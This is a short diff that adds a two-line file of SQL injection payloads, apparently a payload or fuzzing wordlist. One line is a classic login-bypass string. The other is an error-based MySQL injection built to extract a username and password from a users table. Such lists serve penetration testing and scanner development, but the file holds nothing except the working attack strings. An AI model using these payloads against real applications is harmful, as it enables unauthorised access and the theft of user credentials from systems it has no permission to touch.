@@ -1,0 +1,2 @@
+' OR '1'='1' -- 
+' AND EXTRACTVALUE(0, (SELECT CONCAT('$',username,':', password) FROM users LIMIT 0,1)) #
